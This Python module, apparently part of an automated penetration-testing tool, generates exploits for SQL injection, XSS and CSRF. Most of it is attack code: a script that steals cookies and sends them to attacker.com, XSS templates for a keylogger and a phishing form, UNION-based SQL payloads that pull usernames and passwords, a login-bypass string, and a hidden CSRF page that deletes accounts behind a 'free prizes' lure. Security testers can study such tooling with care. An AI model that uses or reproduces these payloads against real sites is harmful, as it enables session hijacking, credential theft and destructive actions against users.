"""
Exploit Generator - Automatic PoC Creation
Generates working proof-of-concept exploits for confirmed vulnerabilities
"""
import asyncio
from typing import Dict, List, Optional
from dataclasses import dataclass
from enum import Enum
import base64
import urllib.parse

from core.intelligence_engine import Vulnerability, VulnerabilityType, Severity


class ExploitLanguage(Enum):
    PYTHON = "python"
    BASH = "bash"
    JAVASCRIPT = "javascript"
    CURL = "curl"


@dataclass
class Exploit:
    """Generated exploit with proof-of-concept code"""
    vulnerability_id: str
    title: str
    language: ExploitLanguage
    code: str
    description: str
    prerequisites: List[str]
    impact: str
    validated: bool = False


class ExploitGenerator:
    """
    Generates working exploits from vulnerability data
    Uses templates and mutation for target-specific payloads
    """
    
    def __init__(self):
        self.templates = self._load_templates()
    
    def _load_templates(self) -> Dict:
        """Load exploit templates"""
        return {
            VulnerabilityType.SQL_INJECTION: self._sqli_templates(),
            VulnerabilityType.XSS_REFLECTED: self._xss_templates(),
            VulnerabilityType.CSRF: self._csrf_templates(),
        }
    
    async def generate_exploit(self, vuln: Vulnerability) -> List[Exploit]:
        """
        Generate exploit code for a vulnerability
        Returns multiple exploits in different languages
        """
        exploits = []
        
        if vuln.type == VulnerabilityType.SQL_INJECTION:
            exploits.extend(await self._generate_sqli_exploit(vuln))
        elif vuln.type in [VulnerabilityType.XSS_REFLECTED, VulnerabilityType.XSS_STORED]:
            exploits.extend(await self._generate_xss_exploit(vuln))
        elif vuln.type == VulnerabilityType.CSRF:
            exploits.extend(await self._generate_csrf_exploit(vuln))
        
        return exploits
    
    async def _generate_sqli_exploit(self, vuln: Vulnerability) -> List[Exploit]:
        """Generate SQL injection exploitation code"""
        
        # Python exploit
        python_code = f"""#!/usr/bin/env python3
\"\"\"
SQL Injection Exploit - {vuln.title}
Target: {vuln.url}
Parameter: {vuln.parameter}
\"\"\"

import requests
import sys

def exploit_sqli(target_url, param_name):
    \"\"\"Exploit SQL injection to extract data\"\"\"
    
    # Test payload
    payload = "{vuln.payload}"
    
    params = {{param_name: payload}}
    
    print(f"[*] Testing SQL injection on {{target_url}}")
    print(f"[*] Payload: {{payload}}")
    
    response = requests.get(target_url, params=params)
    
    if response.status_code == 200:
        print("[+] Injection successful!")
        print(f"[+] Response length: {{len(response.text)}}")
        
        # Extract data
        # TODO: Add data extraction logic
        
        return True
    else:
        print("[-] Injection failed")
        return False

if __name__ == "__main__":
    target = "{vuln.url}"
    param = "{vuln.parameter}"
    
    exploit_sqli(target, param)
"""
        
        # cURL one-liner
        encoded_payload = urllib.parse.quote(vuln.payload or "")
        curl_code = f"""# SQL Injection - cURL Command
curl -v "{vuln.url}?{vuln.parameter}={encoded_payload}"
"""
        
        exploits = [
            Exploit(
                vulnerability_id=f"sqli_{hash(vuln.url)}",
                title=f"SQLi Exploit - {vuln.parameter}",
                language=ExploitLanguage.PYTHON,
                code=python_code,
                description="Automated SQL injection exploitation script",
                prerequisites=["requests library: pip install requests"],
                impact="Database data extraction, authentication bypass",
                validated=False
            ),
            Exploit(
                vulnerability_id=f"sqli_{hash(vuln.url)}_curl",
                title=f"SQLi Test - {vuln.parameter} (cURL)",
                language=ExploitLanguage.CURL,
                code=curl_code,
                description="Quick test command for SQL injection",
                prerequisites=["cURL installed"],
                impact="Verify SQL injection vulnerability",
                validated=False
            )
        ]
        
        return exploits
    
    async def _generate_xss_exploit(self, vuln: Vulnerability) -> List[Exploit]:
        """Generate XSS exploitation code"""
        
        # JavaScript cookie stealer
        js_code = f"""/*
 * XSS Cookie Stealer
 * Target: {vuln.url}
 * Parameter: {vuln.parameter}
 */

// Step 1: Extract all cookies
const cookies = document.cookie;

// Step 2: Send to attacker server
const attackerServer = 'https://attacker.com/steal';
fetch(attackerServer + '?cookies=' + encodeURIComponent(cookies));

// Step 3: Redirect to avoid suspicion
setTimeout(() => {{
    window.location = document.location.href;
}}, 100);

console.log('Cookies stolen:', cookies);
"""
        
        # HTML PoC
        html_code = f"""<!DOCTYPE html>
<html>
<head>
    <title>XSS Proof of Concept</title>
</head>
<body>
    <h1>XSS Vulnerability Demonstration</h1>
    <p>Target: <code>{vuln.url}</code></p>
    <p>Parameter: <code>{vuln.parameter}</code></p>
    
    <form action="{vuln.url}" method="GET">
        <input type="hidden" name="{vuln.parameter}" value="{vuln.payload}">
        <button type="submit">Trigger XSS</button>
    </form>
    
    <h2>Payload</h2>
    <pre>{vuln.payload}</pre>
    
    <h2>Impact</h2>
    <p>This allows an attacker to:</p>
    <ul>
        <li>Steal session cookies</li>
        <li>Perform actions as the victim</li>
        <li>Deface the website</li>
        <li>Redirect to malicious sites</li>
    </ul>
</body>
</html>
"""
        
        exploits = [
            Exploit(
                vulnerability_id=f"xss_{hash(vuln.url)}",
                title=f"XSS Cookie Stealer - {vuln.parameter}",
                language=ExploitLanguage.JAVASCRIPT,
                code=js_code,
                description="JavaScript payload to steal cookies via XSS",
                prerequisites=["Attacker-controlled server to receive stolen data"],
                impact="Session hijacking, account takeover",
                validated=False
            ),
            Exploit(
                vulnerability_id=f"xss_{hash(vuln.url)}_html",
                title=f"XSS PoC - {vuln.parameter}",
                language=ExploitLanguage.BASH,  # Using BASH as HTML isn't in enum
                code=html_code,
                description="HTML proof-of-concept for XSS demonstration",
                prerequisites=["Web browser"],
                impact="Demonstrates XSS vulnerability",
                validated=False
            )
        ]
        
        return exploits
    
    async def _generate_csrf_exploit(self, vuln: Vulnerability) -> List[Exploit]:
        """Generate CSRF exploitation code"""
        
        html_code = f"""<!DOCTYPE html>
<html>
<head>
    <title>CSRF Exploit</title>
</head>
<body>
    <h1>Click here for free prizes!</h1>
    
    <!-- Hidden CSRF Form -->
    <form id="csrfForm" action="{vuln.url}" method="POST" style="display:none;">
        <input name="action" value="delete_account">
        <input name="confirm" value="yes">
    </form>
    
    <script>
        // Auto-submit on page load
        document.getElementById('csrfForm').submit();
    </script>
</body>
</html>
"""
        
        return [
            Exploit(
                vulnerability_id=f"csrf_{hash(vuln.url)}",
                title="CSRF Auto-Submit Form",
                language=ExploitLanguage.BASH,
                code=html_code,
                description="Malicious page that performs CSRF attack",
                prerequisites=["Victim must be authenticated", "Victim must visit malicious page"],
                impact="Unauthorized actions as authenticated user",
                validated=False
            )
        ]
    
    def _sqli_templates(self) -> Dict:
        """SQL injection exploit templates"""
        return {
            "data_extraction": """
            # Extract database version
            ' UNION SELECT @@version--
            
            # Extract database name
            ' UNION SELECT database()--
            
            # Extract tables
            ' UNION SELECT table_name FROM information_schema.tables--
            
            # Extract columns
            ' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
            
            # Extract data
            ' UNION SELECT username,password FROM users--
            """
        }
    
    def _xss_templates(self) -> Dict:
        """XSS exploit templates"""
        return {
            " cookie_stealer": "<script>new Image().src='http://attacker.com/?c='+document.cookie;</script>",
            "keylogger": """<script>
                document.onkeypress = function(e) {
                    fetch('http://attacker.com/log?key='+e.key);
                }
                </script>""",
            "phishing": """<script>
                document.write('<form action="http://attacker.com/phish"><input name="password" type="password"></form>');
                </script>"""
        }
    
    def _csrf_templates(self) -> Dict:
        """CSRF exploit templates"""
        return {
            "auto_submit": """<form method="POST" action="{action}">
                <input name="{param}" value="{value}">
                </form>
                <script>document.forms[0].submit();</script>"""
        }
    
    async def validate_exploit(self, exploit: Exploit) -> bool:
        """
        Validate exploit in safe sandboxed environment
        CRITICAL: Must run in isolated Docker container
        """
        # TODO: Implement Docker-based validation
        # 1. Spin up isolated container
        # 2. Run exploit code
        # 3. Verify intended behavior
        # 4. Capture results
        # 5. Teardown container
        
        return False


# Example usage
async def main():
    # Mock vulnerability for testing
    from core.intelligence_engine import Vulnerability, VulnerabilityType, Severity
    
    vuln = Vulnerability(
        type=VulnerabilityType.SQL_INJECTION,
        severity=Severity.CRITICAL,
        title="SQL Injection in login",
        description="SQL injection in username parameter",
        url="https://example.com/login",
        parameter="username",
        payload="admin' OR '1'='1' --",
        evidence="SQL error in response",
        remediation="Use parameterized queries"
    )
    
    generator = ExploitGenerator()
    exploits = await generator.generate_exploit(vuln)
    
    for exploit in exploits:
        print(f"\n=== {exploit.title} ===")
        print(f"Language: {exploit.language.value}")
        print(f"Code:\n{exploit.code}")


if __name__ == "__main__":
    asyncio.run(main())
